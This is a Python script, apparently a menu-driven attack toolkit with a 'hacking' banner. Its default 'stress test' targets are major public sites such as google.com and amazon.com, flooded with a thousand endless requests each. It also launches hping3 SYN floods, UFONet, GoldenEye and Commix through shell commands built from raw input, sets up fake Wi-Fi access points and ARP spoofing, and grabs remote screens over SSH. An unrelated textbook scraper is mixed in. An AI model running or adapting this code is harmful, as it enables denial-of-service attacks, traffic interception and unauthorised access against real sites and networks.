import requests
from bs4 import BeautifulSoup
import threading
import time
import aiohttp
import asyncio
import random
import subprocess
from googlesearch import search
import shutil
import os

# Other imports for screen capture
import paramiko
import cv2
import numpy as np

# List of high-traffic websites for testing
default_urls = [
    "http://example.com", "http://example.org", "http://example.net",
    "http://google.com", "http://facebook.com", "http://amazon.com",
    "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
    "http://twitter.com", "http://instagram.com", "http://linkedin.com",
    "http://netflix.com", "http://bing.com", "http://reddit.com"
]

# List of user-agents to randomize requests
default_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

# Web crawler function
def web_crawler(start_url, max_depth=2):
    visited = set()

    def crawl(url, depth):
        if depth > max_depth or url in visited:
            return
        visited.add(url)
        try:
            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)})
            soup = BeautifulSoup(response.text, 'html.parser')
            print(f"Crawled URL: {url}")
            for link in soup.find_all('a', href=True):
                crawl(link['href'], depth + 1)
        except Exception as e:
            print(f"Error crawling {url}: {e}")

    crawl(start_url, 0)

async def fetch(session, url, ip=None):
    headers = {'User-Agent': random.choice(default_user_agents)}
    connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None  # Bind to the IP if provided
    while True:
        try:
            async with session.get(url, headers=headers) as response:
                await response.text()
        except Exception as e:
            print(f"Error: {e}")
            await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting

async def start_flood(url, ip=None):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(1000):  # Increase the number of asynchronous requests
            task = asyncio.create_task(fetch(session, url, ip))
            tasks.append(task)
        await asyncio.gather(*tasks)

def network_stress(ip=None, custom_urls=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    urls = custom_urls if custom_urls else default_urls
    for url in urls:
        tasks.append(loop.create_task(start_flood(url, ip)))
    loop.run_until_complete(asyncio.wait(tasks))

def connect_and_stress(target_ip, relay_ip):
    # Example function to connect to a relay IP and then perform stress testing
    print(f"Connecting to {relay_ip} to relay stress test to {target_ip}")
    # Placeholder for connecting logic, e.g., using SSH or a VPN
    # Once connected, initiate network stress
    network_stress(target_ip)

def wifi_spoofing():
    # Example command for WiFi spoofing
    command = ["airbase-ng", "--essid", "Free_WiFi", "wlan0"]
    subprocess.run(command)

def arp_spoofing(target_ip, spoof_ip):
    # Example command for ARP spoofing
    command = ["arpspoof", "-t", target_ip, spoof_ip]
    subprocess.run(command)

def scrape_chinese_textbooks(query):
    results = search(query, num_results=10, lang="zh")
    return results

def display_books(books):
    for book in books:
        print(f"Link: {book}")
        print("-" * 20)

# Helper function to find tool paths
def find_tool_path(tool_name):
    path = shutil.which(tool_name)
    if not path:
        raise FileNotFoundError(f"'{tool_name}' not found in PATH")
    return path

# Define functions for additional tools
def run_syn_flood(target_ip):
    command = f"hping3 -S --flood -V {target_ip}"
    subprocess.run(command, shell=True)

def run_ufo_net(target_url):
    command = f"ufonet -a {target_url}"
    subprocess.run(command, shell=True)

def run_goldeneye(target_url):
    command = f"goldeneye {target_url}"
    subprocess.run(command, shell=True)

def run_websploit():
    command = "websploit"
    subprocess.run(command, shell=True)

def run_commix(target_url):
    command = f"commix --url={target_url}"
    subprocess.run(command, shell=True)

def capture_screen(ip_address, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip_address, username=username, password=password)

        # Command to capture the screen and save it to a file
        command = "import -window root screenshot.png"
        stdin, stdout, stderr = client.exec_command(command)
        stdout.channel.recv_exit_status()

        # Download the screenshot
        sftp = client.open_sftp()
        sftp.get('screenshot.png', 'local_screenshot.png')
        sftp.remove('screenshot.png')
        sftp.close()
        client.close()

        # Display the screenshot
        img = cv2.imread('local_screenshot.png')
        cv2.imshow('Remote Screen', img)
        cv2.waitKey(0)
        cv2.destroyAllWindows()
    except Exception as e:
        print(f"Error capturing screen: {e}")

def check_access(ip_address, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip_address, username=username, password=password)
        client.close()
        print("Access to the computer has been gained.")
    except Exception as e:
        print(f"Error: {e}")

def display_ui():
    while True:
        print("""
         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░███████╗
         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══███╔╝
         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░███╔╝░
         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░███╔╝░░
         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░███████╗
         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░╚══════╝

        [1] Ethernet-based Desktop
        [2] IP-based
        [3] Wireless WiFi-based
        [4] WiFi Spoofing
        [5] ARP Spoofing
        [6] Connect and Stress via Relay IP
        [7] Scrape Chinese Textbooks
        [8] Stress Test a Custom URL
        [9] Web Crawling
        [10] Run SYN Flood
        [11] Run UFOnet
        [12] Run GoldenEye
        [13] Run WebSploit
        [14] Run Commix
        [15] Control Other Computer
        [16] View Monitor of Other Computer
        [17] Check Access to Other Computer
        [18] Exit
        """)

        choice = input("Select the method (1-18): ").strip()
        ip_address = None

        if choice == "1":
            print("Selected Ethernet-based Desktop")
            nearby_options = ["Option1", "Option2", "Option3"]
            print("Select a nearby device:")
            for i, option in enumerate(nearby_options, start=1):
                print(f"[{i}] {option}")
            print("[4] Other (Enter MAC address or IP)")
            device_choice = input("Select (1-4): ").strip()
            if device_choice == "4":
                ip_address = input("Enter the MAC address or IP address: ").strip()
            proceed = input("Proceed with Ethernet stress test? (1 for Yes, 2 for No): ").strip()
            if proceed == "1":
                print("Starting Ethernet-based stress test...")
                network_stress(ip_address)
            else:
                continue
        elif choice == "2":
            ip_address = input("Enter the IP address to use: ").strip()
        elif choice == "3":
            print("Selected Wireless WiFi-based")
            nearby_options = ["Option1", "Option2", "Option3"]
            print("Select a nearby device:")
            for i, option in enumerate(nearby_options, start=1):
                print(f"[{i}] {option}")
            print("[4] Other (Enter MAC address or IP)")
            device_choice = input("Select (1-4): ").strip()
            if device_choice == "4":
                ip_address = input("Enter the MAC address or IP address: ").strip()
            proceed = input("Proceed with Wireless WiFi-based stress test? (1 for Yes, 2 for No): ").strip()
            if proceed == "1":
                print("Starting Wireless WiFi-based stress test...")
                network_stress(ip_address)
            else:
                continue
        elif choice == "4":
            print("Selected WiFi Spoofing")
            wifi_spoofing()
        elif choice == "5":
            target_ip = input("Enter the target IP address: ").strip()
            spoof_ip = input("Enter the spoof IP address: ").strip()
            print("Selected ARP Spoofing")
            arp_spoofing(target_ip, spoof_ip)
        elif choice == "6":
            target_ip = input("Enter the target IP address: ").strip()
            relay_ip = input("Enter the relay IP address: ").strip()
            print("Selected Connect and Stress via Relay IP")
            connect_and_stress(target_ip, relay_ip)
        elif choice == "7":
            query = input("Enter the search query in Chinese: ").strip()
            books = scrape_chinese_textbooks(query)
            display_books(books)
        elif choice == "8":
            custom_url = input("Enter the URL to stress test: ").strip()
            proceed = input("Proceed with stress test on the custom URL? (1 for Yes, 2 for No): ").strip()
            if proceed == "1":
                print("Starting stress test on the custom URL...")
                network_stress(custom_urls=[custom_url])
            else:
                continue
        elif choice == "9":
            start_url = input("Enter the start URL for web crawling: ").strip()
            max_depth = int(input("Enter the maximum depth for web crawling: ").strip())
            print("Starting web crawling...")
            web_crawler(start_url, max_depth)
        elif choice == "10":
            target_ip = input("Enter the target IP address for SYN Flood: ").strip()
            print(f"Running SYN Flood on {target_ip}...")
            run_syn_flood(target_ip)
        elif choice == "11":
            target_url = input("Enter the target URL for UFOnet: ").strip()
            print(f"Running UFOnet on {target_url}...")
            run_ufo_net(target_url)
        elif choice == "12":
            target_url = input("Enter the target URL for GoldenEye: ").strip()
            print(f"Running GoldenEye on {target_url}...")
            run_goldeneye(target_url)
        elif choice == "13":
            print("Running WebSploit...")
            run_websploit()
        elif choice == "14":
            target_url = input("Enter the target URL for Commix: ").strip()
            print(f"Running Commix on {target_url}...")
            run_commix(target_url)
        elif choice == "15":
            ip_address = input("Enter the IP address of the other computer: ").strip()
            print(f"Using IP address: {ip_address} to control the other computer")
            # Implement your control logic here
            # Example: Send a command to the other computer
            command = f"ssh user@{ip_address} 'your-command-here'"
            subprocess.run(command, shell=True)
        elif choice == "16":
            ip_address = input("Enter the IP address of the other computer: ").strip()
            username = input("Enter the username: ").strip()
            password = input("Enter the password: ").strip()
            capture_screen(ip_address, username, password)
        elif choice == "17":
            ip_address = input("Enter the IP address of the other computer: ").strip()
            username = input("Enter the username: ").strip()
            password = input("Enter the password: ").strip()
            check_access(ip_address, username, password)
        elif choice == "18":
            print("Exiting...")
            break
        else:
            print("Invalid option selected.")
        
        input("Press Enter to return to the menu...")

if __name__ == "__main__":
    display_ui()
